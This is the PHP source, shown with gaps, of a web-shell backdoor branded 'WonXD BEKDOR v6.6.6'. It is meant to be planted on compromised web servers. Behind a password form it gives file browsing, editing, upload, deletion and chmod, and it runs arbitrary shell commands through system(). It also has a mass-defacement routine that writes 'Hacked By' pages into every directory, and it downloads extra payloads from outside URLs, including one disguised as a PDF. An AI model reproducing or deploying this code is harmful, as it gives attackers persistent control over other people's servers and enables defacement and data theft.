...
$_COOKIE = cl($_COOKIE);
$_WONXD = array_merge($_POST, $_GET);
$_WONXD = array_map("xp", $_WONXD);
...
switch (true) {
	case ($_WONXD['dir']): $dir = str_replace("\\", "/", $_WONXD['dir']);
	@chdir($dir);
break;
...
switch(true) {
	case (get_magic_quotes_gpc()): function stripslashes_array($array) {
		...
		$_WONXD = stripslashes_array($_WONXD);
		$_COOKIE = stripslashes_array($_COOKIE);
}

switch (true) {
	case (!empty(sec)): switch (true) {
	case (($_WONXD['pass']) && (md5($_WONXD['pass']) == sec)): vb(md5($_SERVER['HTTP_HOST']) , sec);
break;
...
<head>
    ...
    <meta property="og:image" content="https://i.ibb.co/xzdQL1m/20240314-064756.png">
    ...
    <meta name="author" content="WonXD677">
        ...
        <div class="login-container">
            <form action="" method="post">
                <table>
                    ...
                    <center>
                    <img src="https://i.ibb.co/xzdQL1m/20240314-064756.png" height="300px" width="300px"></img>
                    	</center>
                    <td style="width:70%">
                        <input type="password" placeholder="root@localhost ~ ;" name="pass">
                    </td>
                    <td style="text-align:right;width:20%">
                        <button type="submit" class="btn-exe" name="loginin">
...
<head>
    ...
    <meta name="author" content="This Page Not Found">
    <meta name="theme-color" content="#1D9D73">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="#1D9D73">
    <meta name="msapplication-navbutton-color" content="#1D9D73">
    ...
    <div class="co-ontainer-2">
        ...
        <div id="particles-js"></div>
            <div class="menus atas-ae" style="background:none">
                <div class="co-ontainer-3"><span id="judul" class="">WonXD BEKDOR v6.6.6</span>   
...
switch ($_WONXD['command']) {
	case 'logout': r($_SERVER['PHP_SELF']);
		setcookie(md5($_SERVER['HTTP_HOST']), time() - 3600);
break;

	case 'download': $dir = $_WONXD['file'];
...
break;
	...
	case 'delete': $delete = unlink($_WONXD['file']);
switch (true) {
...
break;
	...
	case 'view': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">SOURCE VIEWER</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span> ' . basename($_WONXD['file']) . ' <span class="label-success">]</span></td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_WONXD['file']) . '")\'>' . $size . '</td></table><hr>';
		print "<table>
<th><button class='coL-btn-option-active'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></th>
<th><a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-file-text zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-wrench zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-delete zmdi-hc-fw'></i></button></a></th></table></div>";
	$source = htmlspecialchars(@file_get_contents($_WONXD['file']));
switch (true) {
...
break;
	...
	case ($_WONXD['save']): $save = file_put_contents($_WONXD['file'], $_WONXD['src']);
switch (true) {
...
break;
	...
	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">EDIT SOURCE</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span> ' . basename($_WONXD['file']) . ' <span class="label-success">]</span> </td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_WONXD['file']) . '")\'>' . $size . '</td></table><hr>';
	print "<table>
<th><a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></a></th>
...
switch (true) {
	case (empty($source)): print "<form method='post' action='?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "'  style='margin:0px'>";
		print '<script type="text/javascript">
$(function() {
...
break;
	default: print "<form method='post' action='?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "' style='margin:0px'>";
		print '<script type="text/javascript">
$(function() {
	$(".lined").linedtextarea({selectedLine: 1});
}); </script>';
...
break;
	...
	case ($_WONXD['rename']):
		$rename = rename($_WONXD['file'], "$dir/" . htmlspecialchars($_WONXD['rename']) . "");
switch (true) {
	case ($rename): mtr("?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $dir . "/" . $_WONXD["rename"]);
		bacot('File renamed');
break;
	default: bacot('Permission denied');
	}
	...
	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">RENAME FILE</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span>  ' . basename($_WONXD['file']) . ' <span class="label-success">]</span></td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_WONXD['file']) . '")\'>' . $size . '</td></table><hr>';
	print "<table>
<th><a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></a></th>
...
<th><a onclick=\"c('?" . x7 . "delete&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-delete zmdi-hc-fw'></i></button></a></th></table></div>
	...
	<center>
		<i class='zmdi zmdi-file-text zmdi-hc-fw zmdi-hc-4x'></i></center><br /><br /><form action='?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "' style='margin:0px' method='post'>
<table cellspacing='0'>
	<td align='center' style='width:10%'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i> </td><td style='width:70%'><input type='text' value='" . basename($_WONXD['file']) . "' name='rename' id='vrn'></td><td style='width:20%'>
...
break;
	...
	case ($_WONXD['perm']):
switch (true) {
	case (chmod($_WONXD['file'], octdec($_WONXD['perm']))): mtr("?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_WONXD['file']);
		bacot('Items changed mode to '.decoct(octdec($_WONXD['perm'])));
break;
	default: bacot('Permission denied');
	}
}

	print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">CHMOD FILE</td></table></div><div class="coL-option"><table><td align="center" style="width:30px"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i> </td><td class="elip"><span class="label-success">[</span>  ' . basename($_WONXD['file']) . ' <span class="label-success">]</span> </td><td style="width:90px" class="coL-option-panel" align="center" onclick=\'c("?' . x7 . 'download&' . x5 . $dir . '&' . x6 . $dir . '/' . basename($_WONXD['file']) . '")\'>' . $size . '</td></table><hr>';
	print "<table>
<th><a onclick=\"c('?" . x7 . "view&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-eye zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "edit&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-edit zmdi-hc-fw'></i></button></a></th>
<th><a onclick=\"c('?" . x7 . "rename&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "')\"><button class='coL-btn-option'><i class='zmdi zmdi-file-text zmdi-hc-fw'></i></button></a></th>
...
<form action='?" . x7 . "chmod&" . x5 . $dir . "&" . x6 . $_WONXD['file'] . "' style='margin:0px' method='post'>
<table cellspacing='0'>
	<td align='center' style='width:10%'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i> </td><td style='width:70%'>
<input type='number' value='" . substr(sprintf("%o", fileperms($_WONXD['file'])) , -4) . "' name='perm' style='width:100%' id='decoct'></td><td style='width:20%'>
...
switch (true) {
	case ($_WONXD['newpass']): switch (true) {
	case (chipt($_WONXD['newpass']) == $pass): bacot('Password Saar Ini');
break;
	case (changepass($_WONXD['newpass'])): mtr('?' . x5 . $dir . '&' . x7 . 'logout');
		bacot('Done Bang!!');
break;
	default: bacot('Gabisa Di Ganti Nih');
		}
	}
print '<script type="text/javascript">
function validate() {
...
break; 
	...
	case (file_exists("w0n.php")): unlink("w0n.php"); unlink(__FILE__); bacot('Good Bye Baby :\')');
	mtr('http://underxploit.blogspot.com');
	}
break;

case 'renadir': $c = $_WONXD['e'];
switch (true) {
	case ($_WONXD['e']): $e = rename($dir, "" . dirname($dir) . "/" . htmlspecialchars($_WONXD['e']) . "");
switch (true) {
...
case 'chmdir': switch (true) {
	case ($_WONXD['perm']):
switch (true) {
	case (chmod($dir, octdec($_WONXD['perm']))): mtr("?" . x7 . "chmdir&" . x5 . $dir);
		bacot('Directory changed mode to '.decoct(octdec($_WONXD['perm'])));
break;
	default: bacot('Permission denied');
	}
}
...
case 'about': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">ABOUT ME</td></table></div>';
    ...
    <center>
        <font size="4px" style="shadow:2px 2px 0px #fff">W0NXD SH3LL</font>
...
<div class="coL-panel top">
    <table>
        ...
        <td class="td-panel-right">Underxploit Recoded</td>
    </table>
</div>
<div id="paksa"><table class="table-info">
    <tr class="ex-hov">
        ...
        <td class="td-info">: WonXD677 BEKDOR</td>
    <tr class="ex-hov">
        <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Version</td>
        <td class="td-info">: 6.6.6 [ Dark ]</td>
    <tr class="ex-hov">
         <td style="width:110px" class="td-info"><span class="label label-success"><i class="zmdi zmdi-plus zmdi-hc-fw"></i></span> Author</td>
         <td class="td-info">: Koh WonXD</td>
	</table>
</div>
<div class="coL-option">
    <center><br />Ngewe adalah point utama dalam kehidupan, jika kalian belum ngewe, cepat lah ngewe agar anda tetap hidup.<br /><br />
        <center><br />&mdash; From : WonXD &mdash;</center>
	</div>
</div>';
break;
...
switch (true) {
	...
	case ($_WONXD['upload']): $ff = count($_FILES['file']['name']);
		for($i = 0; $i<$ff; $i++) {
...
switch (true) {
	case (@copy($_FILES['file']['tmp_name'][$i], $dir . '/' . $cx)): bacot('Done Bang!!');
break;
	default: bacot('Gagal Upload File');
			   }
			}
		} break;
	} break;
...
if (isset($_WONXD['submit'])) {
	$url = count($_WONXD['url']);
		for($i = 0; $i < $url; $i++){
	$drq = $_WONXD['url'][$i];
...
switch (true) {
	case(empty($_WONXD['uname'][$i])): $ufc = basename($drq);
break;
	default: $ufc = $_WONXD['uname'][$i];
}
switch (true) {
...
if (isset ($_WONXD['base_dir'])) {        
switch (true) {
	case (!file_exists ($_WONXD['base_dir'])) : bacot('Destination not found'); 
}
        @chdir ($_WONXD['base_dir']) or die ('jembut');
 
        $files = @scandir ($_WONXD['base_dir']) or die ("Oh Shit !!<br>");
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_WONXD['file_name'];
                        if (file_put_contents ($index, $_WONXD['index']))
                                print "
		...
		print "<div id='paksa'><textarea name='index' class='lined'># Hacked By WonXD677 !!</textarea>";
print '<script type="text/javascript">
$(function() {
	$(".lined").linedtextarea({selectedLine: 1});
}); </script>';
...
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Text </td><td class='break'> : ".$_WONXD['text']."</td><tr><td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Md5 </td><td class='break'> : ".md5($_WONXD['text'])."</td></table></div>"); } else {
	error('Permission Denied !!');
	}
break;
case '2':
if(crc32($_WONXD['text'])) {
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Text </td><td class='break'> : ".$_WONXD['text']."</td><tr><td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Crc32 </td><td class='break'> : ".crc32($_WONXD['text'])."</td></table></div>"); } else {
	error('Permission Denied !!');
	}
break;
case '3':
if(sha1($_WONXD['text'])) {
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Text </td><td class='break'> : ".$_WONXD['text']."</td><tr><td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Sha1 </td><td class='break'> : ".sha1($_WONXD['text'])."</td></table></div>"); } else {
	error('Permission Denied !!');
	}
break;
case '4':
echo("<div class='coL-option top'><table style='margin-bottom:3px'>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> String </td><td class='break'> : ".$_WONXD['text']."</td><tr>
<td class='td-md5'
style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Md5 </td><td class='break'> : ".md5($_WONXD['text'])."</td><tr>
<td class='td-md5'
style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Crc32 </td><td class='break'> : ".crc32($_WONXD['text'])."</td><tr>
<td class='td-md5' style='width:70px'><span class='label-success'><i class='zmdi zmdi-chevron-right zmdi-hc-fw'></i></span> Sha1 </td><td class='break'> : ".sha1($_WONXD['text'])."</td></table></div>"); 
break;
	}
}
...
if(isset($_WONXD['cmd']) && $_WONXD['cmd']!='') {
		$exec = jmbt(system($_WONXD['cmd'].' 2>&1'));
switch ($exec) {
	case NULL:
...
<table style="margin-top:7px" cellspacing="0"><form method="POST" action="?' . x7 . 'cmd&' . x5 . $dir . '">
	...
	<td style="width:70%;padding-left:3px;padding-right:3px"><input type="text" placeholder="uname -a" name="cmd" id="csl"></td><td style="width:20%;text-align:right"><button type="submit" class="btn-exe" onclick="gp(); return false;"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table></div></div>';
break;
	
	case 'error': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">w0nXD Sh3LL</td></table></div>';
		bacot('Permission denied'); print x9;
break;

	default:
$ddir = @getcwd();
	if (isset($_WONXD['from']))
 @chdir($_WONXD['from']);
	$cwd = @getcwd();
...
if (is_array(@$_WONXD['target']))
		foreach($_WONXD['target'] as $f) {
	if ($f == '..') continue;
			$f = urldecode($f);
...
break;
	default:
switch (true) {
	case (!empty($_WONXD['hcx'])):
				vb('act', $_WONXD['hcx']);
				vb('target', serialize(@$_WONXD['target']));
				vb('from', @$_WONXD['from']);
			}
break;
	}
...
if(document.getElementById("act").value == "") {';
	...
	<td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">w0nXD Sh3LL</td></table></div>';

$dirContent = hs(isset($_WONXD['from']) ? $_WONXD['from'] : $GLOBALS['cwd']);
switch ($dirContent) {
...
switch (true) {
	case (!empty($_WONXD['hcx'])):
		if (preg_match('!s_([A-z]+)_(\d{1})!', $_WONXD['hcx'], $match)) $sort = array(
		$match[1], (int)$match[2]);
}
...
break;
    ...
    print "<input type ='hidden' name ='charset' value ='" . (isset($_WONXD['charset']) ? $_WONXD['charset'] : '') . "'>";
...
if (isset($_WONXD['ndir'])) {
	$cdir = $_WONXD['newinput'];
switch (true) {
	case (is_dir($dir . '/' . $cdir)): bacot('Directory Sudah Ada');
break;
	default: switch (true) {
...
if (isset($_WONXD['nfil'])) {
	$cfile = $_WONXD['newinput'];
switch (true) {
	case (file_exists($dir . '/' . $cfile)): bacot('File Sudah Ada');
break;
...
if (isset($_WONXD['x'])) {
		$rse = $_WONXD['file_name'];
		$zip = new ZipArchive;
switch ($_WONXD['file_name']) {
...
<table style="margin-top:15px"><form method="POST" action="?' . x7 . 'cmd&' . x5 . $dir . '">
	<td align="center" style="width:10%"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></td>
	<td style="width:70%"><input type="text" placeholder="uname -a" name="cmd" id="cnsl"></td><td style="width:20%;text-align:right"><button type="submit" class="btn-exe" id="exc" onclick="gv();return false;"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table>
</div>
...
print '<table class="ex-hov"><td class="td-tools-left"><i class="zmdi zmdi-chart-donut zmdi-hc-fw"></i></td><td class="td-tools-content">Index Killer</td><td class="td-tools-icon"><a onclick=\'c("?' . x7 . 'infection&' . x5 . $dir . '")\'><button class="btn-exe"><i class="zmdi zmdi-long-arrow-right zmdi-hc-fw"></i></button></a></td></table>';
...
if(document.getElementById("c").value == ""){'; s("Pilih file nya kang"); print 'return false;
...
switch ($_WONXD['op']) {
	...
	case (op('adminer.php', 'https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php')): mtr('?' . x5 . $dir);
		bacot('Sukses Kang');
break;
	default: bacot('Gagal Nih Bang');
	}
}

switch ($_WONXD['op']) {
	case ('2'): switch (true) {
	case (op('compress.php', 'http://www.sssim.com/download/w0n.pdf')): mtr('?' . x5 . $dir);
		bacot('Sukses Kang');
break;
	default: bacot('Gagal Nih Bang');
	}
...
print '<option value=""> -- File Alternatif --</option>';
print '<option value="1">Adminer [ adminer.php ]</option>';
print '<option value="2">w0n Mini [ compress.php ]</option>';
print '</select>
</td>
...
<div class="footer">WonXd677 SH3LL</div>';
?>
